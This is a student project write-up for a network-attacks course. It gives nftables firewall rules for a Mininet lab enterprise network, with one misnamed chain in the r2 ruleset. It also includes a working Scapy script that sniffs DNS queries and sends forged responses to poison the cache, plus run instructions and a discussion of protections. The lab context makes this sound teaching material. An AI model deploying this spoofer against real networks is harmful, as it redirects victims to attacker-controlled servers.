# LINFO2347 – Project Network Attacks

## Authors
Deroeux Elric (noma:)
Lévêque Quentin (noma:)

## Basic enterprise network protection
For the basic entreprise network protection we tried to keep our NFT super simplified.

- No statement have been made for routers behavior, we allow them to send/receive ping/connection.
- Routers forward behavior is "default drop" as it is a good practice

### r1 NFTable:
```
#!/usr/sbin/nft -f

flush ruleset

table inet filter { 
    chain input {
        type filter hook input priority 0; policy accept;
    }
    chain forward {
        type filter hook forward priority 0; policy drop;
        
        ct state established,related accept
        
        iif r1-eth0 oif r1-eth12 accept
    }
    chain output {
        type filter hook output priority 0; policy accept;
    }
}
```
- r1 could be ip-oriented `iif r1-eth0 ip saddr 10.1.0.0/24 accept` or shorter `iif r1-eth0 accept`.
- r1 accept response to new/old connections
- DMZ servers can ping each other has the case has been discuted in teams. Otherwise additionnal firewall would have been needed for each DMZ server.

### r2 NFTable: 
```
#!/usr/sbin/nft -f 

flush ruleset

table inet filter { 
    chain input {
        type filter hook input priority 0; policy accept;
    }
    chain forward {
        type filter hook forward priority 0; policy drop;
        
        ct state established,related accept	
        
        iif r2-eth12 oif r2-eth0 ip saddr 10.1.0.0/24 accept
        
        iif r2-eth0 oif r2-eth12 accept
    }
    chain input {
        type filter hook output priority 0; policy accept;
    }
}
```
- r2 need to allow packets from workstations IPs only.
- Everything from internet can come in because of r1 drop policy that will block packet not destinated to DMZ.
### Application of rules:
We modified the topo.py to apply our basic NFTables to r1 and r2.
```python
...
def apply_nftables_rules(net: Mininet) -> None:
    info("Applying nftables rules on r1...\n")
    info(net['r1'].cmd("nft -f ~/LINFO2347/r1.nft"))
    
    info("Applying nftables rules on r2...\n")
    info(net['r2'].cmd("nft -f ~/LINFO2347/r2.nft"))
...
```
We call this function after the `add_routes` function.


## DNS Cache Poisoning

### Attack
This script manage `r1` to intercept DNS requests from the workstations (`ws2` and `ws3`) and spoof the DNS response. By doing so, it aim to poison the DNS cache with a forged IP address (`1.2.3.4`) configurable, redirecting future requests for that domain (`example.com`) to a malicious server.
We use `example.com` due to the configuration of the DNS server that associate `example.com` to the IP adress `192.0.2.192` as it's specified in the dnsmasq config `address=/example.com/192.0.2.192`

#### Config
```
TARGET_DOMAIN = b"example.com."
FAKE_IP = "1.2.3.4"
DNS_PORT = 5353
```
#### Sniffing
`r1` start sniffing all the DNS packet that go through `r1-eth0` and start to anaylze them.
```python
from scapy.all import *
...
print(f"Listening for DNS queries on port {DNS_PORT}...")
sniff(filter=f"udp port {DNS_PORT}", iface="r1-eth0", prn=spoof_dns, store=0)
```
#### Filtering
It drop the packet that are not query and that are not asking about the domain `example.com`
```python
    ...
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        qname = pkt[DNSQR].qname
    else:
        return
        
    if qname != TARGET_DOMAIN:
        return
        
    print(f"{qname.decode()} found, spoofing DNS response ...")
    ...
```
#### Spoofing
It use informations of intercepted packet to build a credible response. 
It invert source and destination IPs and ports, it use the same ID request and use the fake ip adress.
Then it send the spoofed packet that should come before the DNS response.
```python
...
    ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    udp = UDP(dport=pkt[UDP].sport, sport=DNS_PORT)
    dns = DNS(
        id=pkt[DNS].id,
        qr=1,
        aa=1,
        qd=pkt[DNS].qd,
        an=DNSRR(rrname=qname, ttl= 300,rdata=FAKE_IP)
    )
    spoofed_pkt = ip / udp / dns
    send(spoofed_pkt, verbose=0)
    print(f"Spoofed packet sent with ip {FAKE_IP}")
...
```
#### Perform the attack
On `r1` execute the script `python3 ~/LINFO2347/attacks/dns_cache_poisoning.py`
Then on `ws2`OR/AND `ws3` perform a DNS query to the DNS server asking for example.com `dig @10.12.0.20 -p 5353 example.com +short`
#### Result
Based on the DNS response of the `dig` command
Either `192.0.2.192` if the attack missed or `1.2.3.4` if it worked

Note : We are aware that the DNS cache poisoning could have been performed on the DNS instead on the Workstation, that would have impacted all the network and be more persistant. 
The step would have been similar but the sniff would have to be on r2 to intercept our DNS server request.

### Protection
Since the attack is timed, `related/established` rule wont work. 
Neither for `ip saddr 10.12.0.20` or `sport 5353` due to the spoofing.
Default drop on `r1` output doesn't seems to work due to spoofing.

Allowing dnssec in the `/etc/dnsmasq.conf` could protect.

In a normal environement it would be very hard to assemble right timing, right ID and right port as it could be randomise too.
In one of these condition not proprelly done we could block the attack using an nftable.

(Or surely is it possible but we didnt found the way to do it).
